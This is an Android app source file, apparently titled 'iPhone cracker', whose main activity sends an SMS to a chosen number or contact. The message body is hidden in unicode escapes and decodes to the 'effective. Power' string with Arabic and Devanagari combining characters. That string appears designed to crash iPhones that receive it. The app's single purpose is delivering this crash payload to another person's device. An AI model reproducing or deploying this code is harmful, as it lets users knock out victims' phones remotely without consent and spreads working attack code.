package com.anassaeed.iphonecracker;



import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

@SuppressLint("ShowToast")
public class MainActivity extends Activity {
	private static final int PICK_CONTACT = 3;
	private static final String message = "\u0065\u0066\u0066\u0065\u0063\u0074\u0069\u0076\u0065\u002E\u0020\u0020\u0050\u006F\u0077\u0065\u0072\u0020\u00644\u064F\u0644\u064F\u0635\u0651\u0628\u064F\u0644\u064F\u0644\u0635\u0651\u0628\u064F\u0631\u0631\u064B\u0020\u0963\u0020\u0963\u0068\u0020\u0963\u0020\u0963\u0020\u5197";
	EditText editText;
	Button button;
	String number;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		editText = (EditText) findViewById(R.id.text);
		button = (Button) findViewById(R.id.button);
		button.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				number = editText.getText().toString();
				sendMessage();
				Toast.makeText(getApplicationContext(), "Message sent",Toast.LENGTH_LONG);
			}
		});
		 Button btnSelectContact = (Button) findViewById(R.id.btnSelectContact);
		    btnSelectContact.setOnClickListener(new View.OnClickListener() {
				
				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					 Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI);
				        startActivityForResult(intent, PICK_CONTACT);
				}
			});  
	}
	private void sendMessage(){
		PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), 0);                
	        SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage(number, null, message, pi, null);   
	}
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
	 public void onActivityResult(int reqCode, int resultCode, Intent data){
	        super.onActivityResult(reqCode, resultCode, data);
	        switch(reqCode){
	           case (PICK_CONTACT):
	             if (resultCode == Activity.RESULT_OK){
	                 Uri contactData = data.getData();
	                 @SuppressWarnings("deprecation")
					Cursor c = managedQuery(contactData, null, null, null, null);
	                 if (c.moveToFirst()){
	                	 if (c.moveToFirst()){
	                         // other data is available for the Contact.  I have decided
	                         //    to only get the name of the Contact.
	                         String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
	                         Toast.makeText(getApplicationContext(),"Contact Select "+ name, Toast.LENGTH_SHORT).show();
	                     }
	                     if (Integer.parseInt(c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
	              		    //Query phone here.  Covered next
	                         ContentResolver cr = getContentResolver();
	                         String id = c.getString(
	                                 c.getColumnIndex(ContactsContract.Contacts._ID));
	                    	 if (Integer.parseInt(c.getString(
	                                 c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
	                              Cursor cursor = cr.query(
	               		    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
	               		    null, 
	               		    ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
	               		    new String[]{id}, null);
	               	        while (cursor.moveToNext()) {
	               		    // Do something with phones
	               	        	String dataS = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
	               	        	EditText temp = (EditText) findViewById(R.id.text);
	               	        	temp.setText(dataS);
	               	        } 
	               	        cursor.close();
	                    	 }
	                   }
	              	       
	                 }
	             }
	        }
	    }
	 @SuppressLint("InlinedApi")
	public void FullScreencall() {

		    if(Build.VERSION.SDK_INT < 19){ //19 or above api
		        View v = this.getWindow().getDecorView();
		        v.setSystemUiVisibility(View.GONE);
		    } else {
		            //for lower api versions.
		        View decorView = getWindow().getDecorView(); 
		        int uiOptions = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;
		        decorView.setSystemUiVisibility(uiOptions);
		    }
		}
		private void executeDelayed() {
		    Handler handler = new Handler();
		    handler.postDelayed(new Runnable() {
		        @Override
		        public void run() {
		            // execute after 500ms
		            FullScreencall();
		        }
		    }, 500);
		}
		@Override
		protected void onResume() {
		    super.onResume();
		    executeDelayed();
		}	
		public boolean onTouchEvent(MotionEvent event) {
			MainActivity.this.getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION);
		    	   
		    return true;
		} 
}
